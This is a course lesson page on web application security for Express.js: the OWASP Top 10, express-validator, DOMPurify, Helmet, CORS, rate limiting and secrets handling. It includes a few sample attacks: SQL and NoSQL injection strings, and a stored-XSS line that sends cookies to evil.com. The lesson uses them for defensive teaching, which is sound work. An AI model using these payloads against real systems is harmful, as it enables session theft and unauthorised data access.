---
editorial: true
title: Barrier Magic
subtitle: OWASP, Input Validation, and Secrets Management
hook: "A threat model, validated server boundaries, and a secrets-handling checklist. Identify untrusted input and protected resources."
read: 60
artifact: "A threat model, validated server boundaries, and a secrets-handling checklist"
diagrams:
  - fig1-model
  - fig2-diagnosis
  - fig3-evidence
docs:
  - https://owasp.org/Top10/2025/
  - https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
say:
  - "Boundary: Identify untrusted input and protected resources."
  - "Control: Validate, authorize, and limit each operation."
  - "Evidence: Test abuse cases and record useful security events."
---

## The hook

You know that moment in every isekai where the hero builds their base, recruits their party, establishes their territory, and then the demon lord's army shows up and they realize they forgot to put up a barrier? That is what happens to startups that skip security. Someone built a beautiful app, got users, raised money, and then a script kiddie with SQLMap took it all down because they forgot to sanitize an input field. We are not going to be that founder.

This is the session where your defense stat goes through the roof. We are going to study the OWASP Top 10, the ten most common attack vectors on the internet, and learn how every single one of them works. Then we are going to armor your app with input validation, sanitization, security headers, CORS, rate limiting, and proper secrets management. Every kingdom needs a barrier. By the end of today, yours will be up and running.

Here is the hard truth: breaches kill startups. A single data leak can destroy trust, trigger lawsuits, and burn your reputation before you even get to Series A. The average breach costs $4.45 million, but for startups it is existential. Security is not a checkbox. It is a competitive advantage. Today you learn to think like an attacker so you can defend like a champion.

---

### What the Run button does

The Run button on this page runs a small model in your browser. It does not install a language, open a database, start a server, charge a card, call an AI provider, or move money. The longer walkthroughs are files and commands for a project on your own machine. Install those tools yourself from the official docs linked on this page, keep secrets in your own environment, and use made-up data in the exercises.

A green checkpoint means this page's model behaved the way the checkpoint claims. It does not mean a service you have not started is working. If a tool is missing, keep designing, write down the result you expect, and mark that check as not run. A screenshot of a result you did not produce is not a result.

## The idea

### Evaluate and mitigate common web application security vulnerabilities
You will assess applications against the OWASP Top 10 vulnerability categories and implement server-side defenses including input validation, sanitization, security headers, CORS configuration, and rate limiting to harden Express.js applications against real-world attack vectors.

**You will:**
- Identify the OWASP Top 10 vulnerability categories and describe how each one exploits web applications
- Implement server-side input validation and sanitization using express-validator and DOMPurify
- Configure Helmet.js security headers, CORS whitelisting, and express-rate-limit middleware
- Design a centralized secrets management system with environment variable validation

**You will be able to:**
- Explain injection attacks (SQL, NoSQL, command), XSS (stored, reflected, DOM-based), and CSRF with concrete code examples
- Write express-validator chains that validate, sanitize, and escape user input across all POST/PUT routes
- Configure Helmet.js with custom Content Security Policy directives and CORS with origin whitelisting
- Build a config module that validates required environment variables at startup and fails fast on missing secrets

**Why Security Is a Founder Skill**
- Open with a real breach story: the 2023 MOVEit breach affected 60+ million people from a single SQL injection vulnerability
- At a startup, YOU are the security team. There is no separate department.
- Cost of breaches: average $4.45M per breach (IBM 2023), but for startups it is existential
- Frame security as a competitive advantage, not just a compliance requirement

**The OWASP Top 10 - A Hacker's Playbook**

**Injection Attacks**
- SQL Injection: what it is, how it works
```sql
-- What the developer intended:
SELECT * FROM users WHERE username = 'alice' AND password = 'hunter2';

-- What the attacker sends as username:
' OR '1'='1' --

-- What the database actually runs:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '';
-- Returns ALL users. Game over.
```
- NoSQL Injection in MongoDB:
```javascript
// Vulnerable login route
app.post('/login', async (req, res) => {
  const user = await User.findOne({
    username: req.body.username,
    password: req.body.password
  });
  // Attacker sends: { "username": {"$gt": ""}, "password": {"$gt": ""} }
  // This matches ANY user with a non-empty username and password
});
```
- Command Injection: what happens when you pass user input to shell commands
- Key takeaway: NEVER trust user input. EVER.

**Broken Authentication**
- Weak passwords, credential stuffing, session hijacking
- Why "admin/admin" is still the most common default login
- Session fixation vs session hijacking
- Best practices: bcrypt with high salt rounds, HTTP-only cookies, secure session configuration
```javascript
// BAD: storing passwords in plain text
const unsafeUser = new User({ password: req.body.password }); // NO NO NO

// GOOD: hashing with bcrypt (you already learned this in Unit 4)
const salt = await bcrypt.genSalt(12);
const hash = await bcrypt.hash(req.body.password, salt);
const user = new User({ password: hash });
```

**Cross-Site Scripting / XSS**
- Stored XSS: attacker saves malicious script in your database, every user who views it gets hit
- Reflected XSS: malicious script in a URL parameter gets rendered on the page
```jsx
// Stored XSS example: user submits this as their "bio"
const maliciousBio = '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>';

// If you render this without sanitizing:
res.send(`<div class="bio">${user.bio}</div>`);
// Every visitor to this profile just had their cookies stolen
```
- DOM-based XSS: client-side JavaScript manipulates the DOM unsafely
- Prevention: output encoding, Content Security Policy headers, never use innerHTML with user data

**Cross-Site Request Forgery / CSRF**
- Trick a logged-in user into making a request they did not intend
- Example: a hidden form on a malicious site submits a POST to your banking app
- Prevention: CSRF tokens, SameSite cookies, checking Origin/Referer headers

**Security Misconfiguration**
- Default credentials left in place
- Unnecessary features enabled (directory listing, debug mode in production)
- Missing security headers
- Exposed error messages that reveal stack traces
- Running outdated dependencies with known vulnerabilities (run `npm audit` regularly)

**Other OWASP Hits: Quick Overview**
- Broken Access Control: users accessing resources they should not
- Cryptographic Failures: weak encryption, exposed secrets
- Insecure Design: flaws in the architecture itself
- Server-Side Request Forgery (SSRF): tricking your server into making requests to internal resources
- Software and Data Integrity Failures: not verifying updates, CI/CD poisoning

**Sidebar: OAuth and "Sign in with Google"**

Your capstone uses JWT auth that you built in Unit 4. But you have clicked "Sign in with Google/GitHub/Apple" a thousand times, so you should know what it is: **OAuth 2.0**, a protocol for *delegated* authentication. Instead of your app storing a password, you outsource identity-checking to a provider the user already trusts.

The flow in one breath: your app redirects the user to the provider → the user approves → the provider redirects back with a one-time code → your server exchanges that code (plus your app's client secret) for a token → the token proves who the user is, and from there you issue your own session or JWT exactly as before.

Founder trade-offs:
- **Pros:** no passwords to store or leak (a whole OWASP category removed), lower signup friction, users trust the button
- **Cons:** you depend on a third party for logins, setup requires registering your app with each provider, and account-linking edge cases (same email, different providers) get messy
- **Practical path:** libraries like Passport.js or hosted services (Auth0, Clerk, Firebase Auth) handle the dance for you. Do not hand-roll the OAuth exchange for production — this is a "use the battle-tested library" zone, same as password hashing.

**Common Misconceptions:**
- "I use a framework so I am safe." Frameworks help but do not cover everything. You must still validate input, manage secrets, and configure headers.
- "Security is something you do at the end." Security must be baked in from the start. Retrofitting is harder and more expensive.
- "Only big companies get hacked." Startups are often easier targets because they skip security practices.
- "HTTPS means my app is secure." HTTPS encrypts transit. It does not protect against injection, XSS, or broken authentication.

---

![](diagram:session-10-1/fig1-model)

### Start with assets and trust boundaries

List what the application must protect: user records, credentials, payment entitlements, provider keys, and service availability. Then identify where untrusted input crosses into an operation. A form, URL parameter, webhook, uploaded file, and model response are all possible boundaries. Security work becomes concrete when you can name the asset, actor, operation, and failure you are trying to prevent.

Draw one ordinary request and one abuse request through the same route. A user editing their own profile is ordinary. The same user changing the identifier to another account is an abuse case. The server must enforce the distinction. Hiding the edit button or validating the form in React does not protect a directly invoked endpoint. Use synthetic accounts to demonstrate the boundary in a controlled test environment.

### Validation should create a trusted shape

Validate type, length, range, format, and allowed values according to the operation. Construct a new object containing only accepted fields. Avoid passing a raw request body directly into a database update. Unknown properties such as role or owner can become a privilege escalation if a generic update accepts them. Return clear field-level errors without exposing internal stack traces.

Input validation and output encoding solve different problems. A value may be valid domain data and still need safe rendering in an HTML context. Prefer framework text rendering over constructing HTML strings. If rich HTML is a product requirement, use a maintained sanitizer with a deliberate allowlist and test the allowed behavior. Do not invent a regular expression that claims to remove every dangerous HTML pattern.

### Dependencies and configuration are part of the system

An application can have careful route code and still expose a database through its network configuration. Review debug modes, public directories, error responses, and default accounts. Keep the database private, apply least privilege to service credentials, and avoid shipping development secrets. A configuration review should use actual deployed settings with values redacted, not only an ideal example file.

Dependency audit output is a starting point for investigation. Determine whether the vulnerable path is used, whether a fixed version exists, and whether the update changes behavior. Do not apply a forceful automatic upgrade and assume the application remains correct. Review the lockfile diff and run the checks relevant to the affected package. Record unresolved findings with their context and mitigation.

### Logging must help without becoming another leak

Record authentication failures, denied privileged operations, and unexpected service errors with a request identifier. Avoid passwords, tokens, full payment data, and unnecessary personal content. A log line should let an operator connect an incident to a route and time without exposing the secret that caused it. Access to logs needs its own permissions and retention policy.

The OWASP Top 10:2025 is the awareness reference for this unit; it includes software supply chain failures and mishandling of exceptional conditions alongside access control, injection, and other risks. Use the individual library pages for deeper exercises. The list helps organize questions, but checking ten labels is not a proof that an application is secure. [OWASP Top 10:2025](https://owasp.org/Top10/2025/).

## The demonstration

**BREAK (45-50 min / 0:55-1:05)**

**Live Code: Input Validation and Sanitization (50-75 min / 1:05-1:40)**

Install and configure express-validator:
```bash
npm install express-validator
```

Build a validated registration route step by step:
```javascript
import { body, validationResult } from 'express-validator';

// Validation middleware chain
const registerValidation = [
  body('username')
    .trim()
    .isLength({ min: 3, max: 30 })
    .withMessage('Username must be between 3 and 30 characters')
    .isAlphanumeric()
    .withMessage('Username must contain only letters and numbers')
    .escape(),

  body('email')
    .trim()
    .isEmail()
    .withMessage('Please provide a valid email address')
    .normalizeEmail(),

  body('password')
    .isLength({ min: 8 })
    .withMessage('Password must be at least 8 characters')
    .matches(/[A-Z]/)
    .withMessage('Password must contain at least one uppercase letter')
    .matches(/[0-9]/)
    .withMessage('Password must contain at least one number')
    .matches(/[!@#$%^&*]/)
    .withMessage('Password must contain at least one special character'),

  body('bio')
    .optional()
    .trim()
    .isLength({ max: 500 })
    .withMessage('Bio must be 500 characters or less')
    .escape() // Prevents stored XSS
];

// Route with validation
app.post('/api/register', registerValidation, async (req, res) => {
  // Check for validation errors
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      errors: errors.array().map(err => ({
        field: err.path,
        message: err.msg
      }))
    });
  }

  // If we get here, input is clean
  const { username, email, password, bio } = req.body;
  // ... create user with hashed password
});
```

Sanitizing HTML input with DOMPurify (for rich text fields):
```bash
npm install isomorphic-dompurify
```
```javascript
import DOMPurify from 'isomorphic-dompurify';

// For fields where you WANT some HTML (like a blog post body)
const cleanHTML = DOMPurify.sanitize(req.body.content, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'a'],
  ALLOWED_ATTR: ['href', 'target']
});
// Strips <script>, <iframe>, event handlers, etc.
```

Build reusable validation middleware for common patterns:
```javascript
// middleware/validate.js
export const validateRequest = (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      errors: errors.array().map(err => ({
        field: err.path,
        message: err.msg
      }))
    });
  }
  next();
};

// Now use it cleanly in routes:
router.post('/register', registerValidation, validateRequest, registerController);
router.post('/login', loginValidation, validateRequest, loginController);
```

**Live Code: Secrets, CORS, Helmet, and Rate Limiting (75-90 min / 2:10-2:40)**

**Secrets Management**
```bash
npm install dotenv
```
```dotenv
# .env file (NEVER commit this)
PORT=3000
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/mydb
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production
STRIPE_SECRET_KEY=sk_test_abc123
CLAUDE_API_KEY=sk-ant-abc123

# .gitignore (MUST include .env)
node_modules/
.env
.env.local
.env.production
```
```javascript
// config/index.js - centralized config with validation
import dotenv from 'dotenv';
dotenv.config();

const requiredVars = ['MONGODB_URI', 'JWT_SECRET', 'STRIPE_SECRET_KEY'];

for (const varName of requiredVars) {
  if (!process.env[varName]) {
    console.error(`FATAL: Missing required environment variable: ${varName}`);
    process.exit(1);
  }
}

export const config = {
  port: process.env.PORT || 3000,
  mongoUri: process.env.MONGODB_URI,
  jwtSecret: process.env.JWT_SECRET,
  stripeSecretKey: process.env.STRIPE_SECRET_KEY,
  claudeApiKey: process.env.CLAUDE_API_KEY,
  nodeEnv: process.env.NODE_ENV || 'development'
};
```
- Secret rotation: changing keys periodically, having a plan for when keys are compromised
- Never log secrets. Add a startup check that warns if secrets look like defaults.

**CORS Configuration**
```bash
npm install cors
```
```javascript
import cors from 'cors';

// BAD: allow everything (fine for development, terrible for production)
app.use(cors());

// GOOD: whitelist specific origins
const allowedOrigins = [
  'https://yourdomain.com',
  'https://www.yourdomain.com'
];

if (process.env.NODE_ENV === 'development') {
  allowedOrigins.push('http://localhost:5173'); // Vite dev server
}

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, curl, Postman)
    if (!origin) return callback(null, true);
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    return callback(new Error('Not allowed by CORS'));
  },
  credentials: true, // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**Helmet.js Security Headers**
```bash
npm install helmet
```
```javascript
import helmet from 'helmet';

// One line. Massive security boost.
app.use(helmet());

// What Helmet sets by default:
// Content-Security-Policy: restricts where resources can load from
// X-Content-Type-Options: nosniff (prevents MIME type sniffing)
// X-Frame-Options: SAMEORIGIN (prevents clickjacking)
// X-XSS-Protection: 0 (modern CSP is better, disables legacy filter)
// Strict-Transport-Security: forces HTTPS
// And more...

// Customize if needed (e.g., if you use inline scripts or CDN resources):
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://js.stripe.com"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Sometimes needed for CSS-in-JS
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.stripe.com"],
      frameSrc: ["https://js.stripe.com"],
    }
  }
}));
```

**Rate Limiting**
```bash
npm install express-rate-limit
```
```javascript
import rateLimit from 'express-rate-limit';

// General rate limiter: 100 requests per 15 minutes per IP
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  message: {
    success: false,
    error: 'Too many requests. Please try again later.'
  },
  standardHeaders: true, // Return rate limit info in headers
  legacyHeaders: false
});

// Strict limiter for auth routes: 5 attempts per 15 minutes
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: {
    success: false,
    error: 'Too many login attempts. Please try again in 15 minutes.'
  }
});

// API limiter for expensive operations
const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 10,
  message: {
    success: false,
    error: 'Rate limit exceeded. Please slow down.'
  }
});

// Apply them
app.use('/api/', generalLimiter);
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);
app.use('/api/ai/', apiLimiter); // LLM routes are expensive
```

---

### Runnable checkpoint: a small model

Predict the assertions before pressing Run. This model isolates one idea from the lesson; the manual walkthrough exercises the full environment. Change one input to violate the stated rule, observe the failure, then restore the valid case. Explain why the changed case should fail rather than editing the assertion to accept it.

```js run=checkpoint-10-1
function check(condition, message) {
  if (!condition) throw new Error(message);
  console.log('PASS:', message);
}
function profilePatch(body) {
  if (typeof body.displayName !== 'string' || !body.displayName.trim()) return null;
  return {displayName: body.displayName.trim()};
}
const patch = profilePatch({displayName: ' Ada ', role: 'admin'});
check(patch.displayName === 'Ada', 'Allowed field normalized');
check(!Object.hasOwn(patch, 'role'), 'Privilege field excluded');
console.log('ok: checkpoint-10-1');
```

## Where it breaks

![](diagram:session-10-1/fig2-diagnosis)

### Sanitization replaces authorization

You escape HTML, validate the string, and still let any logged-in user delete any quest, because the route never checks who owns it. Sanitization changes what a string can do. Authorization decides who may do the operation. They fail differently and you need both. Call the route as a second user, with a well-formed id, and expect a refusal. If a clean payload from the wrong person succeeds, the sanitizer did its job and the boundary you meant to protect is open.

### Secrets committed

A key lands in a commit. Removing it in a later commit leaves it in history, and anyone who clones the repo has it. Rotate the secret first, so the leaked value stops working. Then purge the history or accept that the old value is public and must never be trusted again. Add the ignore rule that would have kept the file out, and check that the new key is only in the environment. A rotation you skip because you "deleted the file" is the incident still in progress.

### Audit fix breaks behavior

You upgrade a dependency because an advisory said to, and a route starts rejecting a payload it used to accept. The advisory was real and so is the break. Read the changelog for the version you jumped, run the tests that cover the behavior you ship, and add a test for the case the upgrade changed. Pin the version you actually ran. An audit that goes green by applying every bump, with no test run, has traded a reported risk for an unknown one.

## Your turn

**Exercise 1: Validate Everything (90-110 min / 1:40-2:00)**
- **Objective:** Add comprehensive input validation to an Express API
- **Instructions:**
  1. Take your capstone's registration and login routes (or use a provided starter Express app)
  2. Add express-validator validation to:
     - Registration: validate username (3-30 chars, alphanumeric), email (valid format), password (8+ chars, 1 uppercase, 1 number, 1 special char)
     - Login: validate email format and password is not empty
     - Any POST/PUT route that accepts user input
  3. Add a reusable `validateRequest` middleware that checks for errors and returns a clean error response
  4. Test with intentionally bad input (empty fields, script tags in the username, SQL injection strings)
- **Success Criteria:**
  - Bad input returns 400 with specific error messages per field
  - Script tags are escaped or stripped
  - Valid input passes through normally
  - No route accepts unvalidated user input

**BREAK (110-115 min / 2:00-2:10)**

**Exercise 2: Security Hardening Sprint (115-135 min / 2:10-2:40 -- overlaps with Demo section above)**
- **Objective:** Apply security best practices to an existing Express app in 15 minutes
- **Instructions:**
  1. Install and configure Helmet.js (add `app.use(helmet())`)
  2. Configure CORS to only allow your frontend origin
  3. Add a general rate limiter (100 req/15 min)
  4. Add a strict rate limiter on auth routes (5 req/15 min)
  5. Verify all secrets are in .env and .env is in .gitignore
  6. Add the config validation check (exit if required env vars are missing)
  7. Run `npm audit` and note any vulnerabilities
- **Success Criteria:**
  - Helmet headers visible in browser DevTools (Network tab, check response headers)
  - CORS rejects requests from unauthorized origins
  - Rate limiter returns 429 after exceeding the limit (test with a loop)
  - App crashes on startup if MONGODB_URI is missing from .env

---

## The quest

**Security Audit Lab (135-175 min / 2:40-2:55)**

Work independently to apply everything from this session to your own capstone:

1. **Audit your capstone** against the OWASP Top 10. Walk through each vulnerability category and check whether your application is exposed.
2. **Add express-validator** to every route in your capstone that accepts user input. Do not skip any.
3. **Install and configure** Helmet, CORS, and rate limiting if you have not already done so in the exercises.
4. **Verify secrets management:** Confirm .env is in .gitignore, all secrets are externalized, and your config module validates required variables at startup.
5. **Run `npm audit`** and fix any high or critical vulnerabilities with `npm audit # Review the report; update deliberately and rerun tests`.
6. **Begin your SECURITY_AUDIT.md:** Create the file and start documenting PASS/FAIL status for each item (you will complete this as homework).

Before you move on, read your own validation chain and the order of your middleware.

**Recap + Homework Launch (175-180 min / 2:55-3:00)**
- Recap: OWASP Top 10, input validation, secrets management, CORS, Helmet, rate limiting
- You just leveled up your defense stat by about 500%
- Next session: we turn code into cash with Stripe. Get your Stripe account ready.
- Homework preview: security audit your capstone

---

### Review the artifact

Your deliverable is **A threat model, validated server boundaries, and a secrets-handling checklist**. Keep the result, the evidence, and the limitations together so a reviewer can reproduce the important behavior. Start the review with the user outcome, then trace the three boundaries shown in the working-model diagram. Explain what enters each boundary, what leaves it, and which condition would stop progress.

Use the failure cases above as a rehearsal, not only as reading. Choose a valid fixture, change one relevant condition, and compare the result. Record expected and observed behavior separately. If they disagree, investigate the smallest boundary that could explain the difference. After correcting it, repeat the original valid case to check that the repair did not remove useful behavior.

Ask a peer to review the artifact without your narration. Give them the setup instructions and acceptance criteria, then note where they need additional information. Improve the artifact or its instructions at that point. A complete submission is understandable without the author's memory. Include unresolved questions as explicit follow-up work with a reason and a next action; do not hide them behind a general claim that everything works.

![](diagram:session-10-1/fig3-evidence)

## Side quests

Use these library pages to deepen the decisions in this lesson. Return to the main artifact and apply one idea rather than treating the references as a separate checklist.

## Before next session

**Duration:** 180 minutes
**Pre-work:** Completed Units 1-9 with a working Express/Node.js application and MongoDB. Familiarity with HTTP requests, middleware, REST APIs, and npm.
**Materials:** express-validator, isomorphic-dompurify, helmet, cors, express-rate-limit, dotenv packages. OWASP Top 10 reference. Starter Express app, or the capstone you are already building.

---

**Assignment: Security Audit Your Capstone**
- **Objective:** Run a full security audit on your capstone application
- **Tasks:**
  1. Create a file called `SECURITY_AUDIT.md` in your capstone repo
  2. Go through this checklist and document the status of each item (PASS, FAIL, or N/A):
     - [ ] All secrets are in .env, not hardcoded
     - [ ] .env is listed in .gitignore
     - [ ] Passwords are hashed with bcrypt (salt rounds >= 10)
     - [ ] All user input is validated on the server side
     - [ ] HTML output is escaped or sanitized
     - [ ] Helmet.js is installed and configured
     - [ ] CORS is configured with a whitelist (not `*` in production)
     - [ ] Rate limiting is in place on auth routes
     - [ ] Rate limiting is in place on API routes
     - [ ] `npm audit` reports zero high/critical vulnerabilities
     - [ ] Error messages do not expose stack traces in production
     - [ ] JWT tokens expire within a reasonable timeframe
     - [ ] No sensitive data is held in memory (use HTTP-only cookies)
  3. Fix any items that FAIL
  4. Run `npm audit # Review the report; update deliberately and rerun tests` to patch known vulnerabilities
  5. Commit the audit document and all security fixes
- **Submission:** Push updated capstone repo with SECURITY_AUDIT.md and all fixes
- **Time Estimate:** 2-3 hours
- **Due:** Before Session 10.2

**Stretch Goals (Optional):**
- Research and implement Content Security Policy headers beyond Helmet defaults
- Add a honeypot field to your registration form to catch bots
- Implement account lockout after 5 failed login attempts (store attempt count in the database)

---

### Manual verification and further reading

- [Official reference 1](https://owasp.org/Top10/2025/)
- [Official reference 2](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
